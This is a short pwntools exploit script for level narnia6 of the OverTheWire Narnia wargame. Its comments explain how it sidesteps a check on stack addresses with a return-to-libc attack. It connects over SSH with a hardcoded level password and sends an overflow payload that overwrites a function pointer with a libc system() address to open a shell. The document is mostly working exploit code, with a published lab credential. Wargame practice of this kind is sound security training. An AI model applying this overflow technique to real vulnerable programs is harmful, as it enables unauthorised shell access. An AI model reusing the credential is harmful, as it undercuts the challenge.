from pwn import * 
#there is a protection code at line 31: it checks that the pointer doesn't beging with 0xff.
#If it begins with 0xff it exits immediately without executing the funciton pointed by fp.
#because 0xff refer to an address on the stack 
#it means the author don't want you to perform a bufferoverflow with a ret2addr
#we use return to libc 
#$(python -c 'print "A"*8 + "\x50\xc8\xe4\xf7"') "BBBBBBBB/bin/sh"
user = 'narnia6'
password = 'neezocaeng'

s = ssh(host='narnia.labs.overthewire.org', user=user, password=password, port=2226)
s.set_working_directory('/narnia')

payload  = ""
payload += "A" * 8
payload += "\x50\xc8\xe4\xf7"

payload2  = ""
payload2 += "BBBBBBBB/bin/sh"

p = s.process(['./narnia6',payload,payload2])
p.interactive()